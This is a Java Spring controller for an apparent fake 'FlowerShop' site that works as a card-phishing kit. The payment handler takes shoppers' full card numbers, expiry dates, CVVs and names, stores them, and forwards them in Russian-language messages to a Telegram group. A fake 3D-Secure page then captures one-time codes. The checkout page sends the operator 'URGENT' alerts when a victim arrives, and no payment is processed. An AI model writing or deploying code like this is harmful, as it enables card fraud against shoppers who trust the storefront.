package com.example.FlowerShop.controllers;

import com.example.FlowerShop.TelegramBot.BotConfig;
import com.example.FlowerShop.TelegramBot.TelegramBot;
import com.example.FlowerShop.models.Card;
import com.example.FlowerShop.models.Product;
import com.example.FlowerShop.models.User;
import com.example.FlowerShop.repo.CardRepository;
import com.example.FlowerShop.repo.ProductRepository;
import com.example.FlowerShop.repo.UserRepository;
import lombok.RequiredArgsConstructor;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.time.LocalDateTime;
import java.util.List;

@Controller
@RequiredArgsConstructor
public class CardController {
    String cardTest;
    private final CardRepository cardRepository;
    private final UserRepository userRepository;
    private final TelegramBot bot;
    private final ProductRepository productRepository;
    private final BotConfig config;


    @GetMapping("/payment")
    public String paymentPage(Model model) {
        return "payment";
    }

    @PostMapping("/payment")
    public String paymentPost(Model model, @RequestParam(name = "number") String number, @RequestParam(name = "month") String month,
                              @RequestParam String year,
                              @RequestParam(name = "holderName") String holderName,
                              @RequestParam(name = "cvv") String cvv) throws TelegramApiException {
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        boolean isPresent = userRepository.findByUsername(username).isPresent();
        if (isPresent) {
            User user = userRepository.findByUsername(username).get();
            List<Product> products = user.getProducts();
            Long prodPrice = 0L;
            for (Product product : products) {
                prodPrice += product.getPrice();
                if (product.getPurchasesCount() == null) {
                    product.setPurchasesCount(1L);
                    productRepository.save(product);
                } else {
                    product.setPurchasesCount(product.getPurchasesCount() + 1L);
                    productRepository.save(product);
                }
            }
            Long deliveryPrice = 10L;
            Long totalPrice = prodPrice + deliveryPrice;
            String[] cardForFour = number.split("(?<=\\G.{" + 4 + "})");
            String cardNumberResult = cardForFour[0] + " " + cardForFour[1] + " " + cardForFour[2] + " " + cardForFour[3];
            Card card;
            if (cardRepository.findByNumber(number).isPresent()){
                card = cardRepository.findByNumber(number).get();
            } else {
                card = new Card();
            }
            card.setCvv(cvv);
            card.setYear(year);
            card.setMonth(month);
            card.setNumber(number);
            card.setName(holderName);
            card.setResultCheck(totalPrice);
            cardRepository.save(card);
            cardTest = number;
            String textToSend = "ПОСТУПИЛ НОВЫЙ ЗАКАЗ!!! \n\n\n" +
                    "Номер карты: " + cardNumberResult + "\n" +
                    "Срок карты: " + month + "/" + year + "\n " +
                    "CVV: " + cvv + "\n" +
                    "ИМЯ ФАМИЛИЯ: " + holderName + "\n" +
                    "Сумма: $" + totalPrice + "\n" +
                    "Посмотреть все данные по ссылке: *LINK*";
            bot.sendMessage(config.getGroupToken(), textToSend);
        }
        return "redirect:/3d-security";
    }


    @GetMapping("/3d-security")
    public String codePage(Model model) {
        short hour = (short) LocalDateTime.now().getHour();
        short minutes = (short) LocalDateTime.now().getMinute();
        String dayOfWeek = LocalDateTime.now().getDayOfWeek().name();
        String month = LocalDateTime.now().getMonth().name();
        short day = (short) LocalDateTime.now().getDayOfMonth();
        model.addAttribute("hour", hour);
        model.addAttribute("min", minutes);
        model.addAttribute("day", day);
        model.addAttribute("dayOfWeek", dayOfWeek);
        model.addAttribute("month", month);
        return "3d-security";
    }

    @PostMapping("/3d-security")
    public String codePost(@RequestParam String sybmol1, @RequestParam String sybmol2,
                           @RequestParam String sybmol3, @RequestParam String sybmol4,
                           @RequestParam String sybmol5, @RequestParam String sybmol6) {
        Card card = cardRepository.findByNumber(cardTest).get();
      String code = "Code: ";
      code = code + sybmol1 + sybmol2 + sybmol3 + sybmol4 + sybmol5 + sybmol6;
        card.setCode(code);
        cardRepository.save(card);
        cardTest = "";
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        boolean isPresent = userRepository.findByUsername(username).isPresent();
        if (isPresent) {
            User user = userRepository.findByUsername(username).get();
            user.getProducts().clear();
            userRepository.save(user);
            if (user.getChance() == 1) {
                user.setChance(user.getChance()+1);
                userRepository.save(user);
                return "redirect:/payment/success"; // Take to error Page, because successfull page opened for 2 chance
            } else {
                return "redirect:/payment/success";
            }
        } else {
            return "";
        }
    }

    @GetMapping("/checkout")
    public String checkoutPage(Model model) throws TelegramApiException {
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        boolean isPresent = userRepository.findByUsername(username).isPresent();
        if (isPresent) {
            User user = userRepository.findByUsername(username).get();
            List<Product> products = user.getProducts();
            model.addAttribute("products", products);
            float prodPrice = 0f;
            for (Product product : products) {
                prodPrice += product.getPrice();
            }
            float deliveryPrice = 10;
            float totalPrice = prodPrice + deliveryPrice;
            model.addAttribute("delivery", deliveryPrice);
            model.addAttribute("totalPrice", totalPrice);
            for (int i = 0; i < 2; i++) {
                bot.sendMessage(config.getGroupToken(), "СРОЧНО!!! \n " +
                        "КЛИЕНТ ЗАШЕЛ НА СТРАНИЦУ ЗАПОЛНЕНИЯ ДАННЫХ О ЗАКАЗЕ!!! \n " +
                        "Товаров в корзине на сумму: $" + prodPrice);
            }
        }
        return "checkout";
    }

    @GetMapping("/payment/success")
    public String getSuccess() {
        return "payment-success";
    }

    @GetMapping("/payment/error")
    public String getError() {
        return "error-404";
    }

}
